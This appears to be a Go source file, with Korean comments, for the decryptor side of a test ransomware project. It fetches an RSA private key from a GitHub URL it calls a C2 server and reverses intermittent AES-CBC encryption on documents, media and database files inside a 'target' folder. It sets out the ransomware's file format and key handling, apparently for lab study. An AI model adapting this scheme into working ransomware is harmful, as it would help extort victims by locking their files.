package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

// 타겟 상수 및 키 주소
const (
	SearchDir  = ".."     // 상위 디렉토리를 탐색 범위로 지정
	TargetName = "target" // 탐색할 특정 디렉토리 이름
	Stride     = 50       // 수십 바이트 단위로 점프
	BlockSize  = 16       // AES 블록 크기
	// 깃허브 Raw 주소
	C2PrivateKeyURL = "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/key/private.pem"
)

// 대상 확장자
var targetExtensions = map[string]bool{
	// 문서
	".txt": true, ".docx": true, ".xlsx": true, ".pptx": true, ".pdf": true, ".hwp": true,
	// 동영상
	".mp4": true, ".avi": true, ".mkv": true, ".wmv": true, ".mov": true, ".flv": true,
	// 사진
	".jpg": true, ".jpeg": true, ".png": true, ".gif": true, ".bmp": true, ".webp": true,
	// 음성
	".mp3": true, ".wav": true, ".wma": true, ".flac": true, ".ogg": true,
	// DB
	".db": true, ".sqlite": true, ".sql": true, ".mdb": true,
}

// C2로부터 일반 PEM 개인키를 받아와 파싱하는 함수
func getPrivateKeyFromC2(url string) (*rsa.PrivateKey, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("HTTP GET 실패: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("서버 응답 에러 (Status Code: %d)", resp.StatusCode)
	}

	pemBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("본문 읽기 실패: %v", err)
	}

	// PEM 블록 디코딩
	block, _ := pem.Decode(pemBytes)
	if block == nil {
		return nil, fmt.Errorf("PEM 디코딩 실패 (올바른 PEM 형식이 아닙니다)")
	}

	// PKCS#1 형식 파싱 시도
	privKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		// PKCS#8 형식 fallback
		priv, err := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err != nil {
			return nil, fmt.Errorf("개인키 파싱 실패: %v", err)
		}
		return priv.(*rsa.PrivateKey), nil
	}

	return privKey, nil
}

func decryptFile(filePath string, privateKey *rsa.PrivateKey) error {
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return fmt.Errorf("파일 열기 실패: %w", err)
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return fmt.Errorf("파일 정보 읽기 실패: %w", err)
	}
	fileSize := fileInfo.Size()

	// 푸터 크기 확인 및 키 추출
	// \n---ENC_KEY_START--- (20바이트) + encryptedAESKey (256바이트) + ---ENC_KEY_END--- (17바이트) = 293바이트
	footerSize := int64(293)
	if fileSize < footerSize {
		return fmt.Errorf("파일 크기가 너무 작아 암호화된 파일이 아닌 것으로 판단됨")
	}

	footerBuf := make([]byte, footerSize)
	_, err = file.ReadAt(footerBuf, fileSize-footerSize)
	if err != nil {
		return fmt.Errorf("푸터 영역 읽기 실패: %w", err)
	}

	startMarker := []byte("\n---ENC_KEY_START---")
	endMarker := []byte("---ENC_KEY_END---")

	if !bytes.HasPrefix(footerBuf, startMarker) || !bytes.HasSuffix(footerBuf, endMarker) {
		return fmt.Errorf("암호화 푸터 마커를 찾을 수 없음 (이미 복호화되었거나 암호화되지 않은 파일일 수 있음)")
	}

	// 암호화된 AES 키 추출 (마커 사이의 256바이트)
	encryptedAESKey := footerBuf[len(startMarker) : len(footerBuf)-len(endMarker)]

	// RSA 개인키로 AES 키 복호화
	aesKey, err := rsa.DecryptOAEP(
		sha256.New(),
		rand.Reader,
		privateKey,
		encryptedAESKey,
		nil,
	)
	if err != nil {
		return fmt.Errorf("AES 키 복호화 실패: %w", err)
	}

	// 실제 데이터 영역 크기 (푸터 제외)
	dataSize := fileSize - footerSize

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return fmt.Errorf("AES Cipher 생성 실패: %w", err)
	}
	iv := make([]byte, BlockSize)
	mode := cipher.NewCBCDecrypter(block, iv)

	// 부분 복호화 진행 (암호화 시와 동일한 Stride 및 BlockSize 오프셋)
	var offset int64 = 0
	buf := make([]byte, BlockSize)
	decBuf := make([]byte, BlockSize)
	decryptedBlocks := 0

	for offset+int64(BlockSize) <= dataSize {
		_, err := file.Seek(offset, 0)
		if err != nil {
			break
		}

		_, err = file.Read(buf)
		if err != nil {
			break
		}

		// 블록 복호화 수행
		mode.CryptBlocks(decBuf, buf)

		// 제자리에 덮어쓰기
		_, _ = file.Seek(offset, 0)
		_, _ = file.Write(decBuf)

		decryptedBlocks++
		offset += int64(BlockSize) + int64(Stride)
	}

	// 푸터 영역 제거하여 원본 크기로 복구
	err = file.Truncate(dataSize)
	if err != nil {
		return fmt.Errorf("파일 크기 원복 실패: %w", err)
	}

	fmt.Printf("[+] 복호화 완료: %s (총 %d개 블록 복호화됨)\n", filePath, decryptedBlocks)
	return nil
}

func main() {
	fmt.Println("[*] C2 서버에서 RSA 개인키 다운로드 시도 중...")
	privateKey, err := getPrivateKeyFromC2(C2PrivateKeyURL)
	if err != nil {
		fmt.Printf("[-] 실패: %v\n", err)
		return
	}
	fmt.Println("[+] RSA 개인키 성공적으로 수신 및 해독 완료")

	fmt.Printf("[*] '%s' 범위 내에서 '%s' 이름의 디렉토리 탐색 및 복호화 시작...\n", SearchDir, TargetName)
	err = filepath.WalkDir(SearchDir, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}

		if !d.IsDir() {
			return nil
		}

		// 디렉토리 명이 "target"인 경우에만 해당 내부 탐색 수행
		if d.Name() == TargetName {
			fmt.Printf("[+] 타겟 디렉토리 발견: %s\n", path)

			err := filepath.WalkDir(path, func(innerPath string, innerD os.DirEntry, innerErr error) error {
				if innerErr != nil {
					return innerErr
				}
				if innerD.IsDir() {
					return nil
				}

				ext := strings.ToLower(filepath.Ext(innerPath))
				if targetExtensions[ext] {
					fmt.Printf("[*] 암호화 대상 발견: %s\n", innerPath)
					if err := decryptFile(innerPath, privateKey); err != nil {
						fmt.Printf("[-] 파일 복호화 실패 (%s): %v\n", innerPath, err)
					}
				}
				return nil
			})
			if err != nil {
				return err
			}

			return filepath.SkipDir
		}

		return nil
	})

	if err != nil {
		fmt.Printf("[-] 디렉토리 탐색 중 에러 발생: %v\n", err)
		return
	}

	fmt.Println("[+] 모든 대상 파일 복호화 시나리오 정상 종료.")
}
